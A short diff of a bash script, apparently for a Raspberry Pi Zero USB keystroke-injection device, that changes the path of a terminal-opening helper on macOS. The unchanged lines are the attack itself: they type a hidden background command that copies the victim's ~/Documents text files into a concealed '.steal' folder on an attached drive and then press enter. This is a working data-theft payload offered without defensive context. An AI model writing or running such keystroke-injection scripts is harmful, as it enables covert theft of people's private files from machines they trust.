@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-/usr/local/pi0usbbox/platform/macos/openterm
+/usr/local/pi0usbbox/macos/openterm
 # assume partition label name is 'ChisDisk'
 hid-print 'nohup cp -r ~/Documents/*.txt /Volumes/ChisDisk/.steal 2>&1 >/dev/null &'
 hid-sendkeys enter
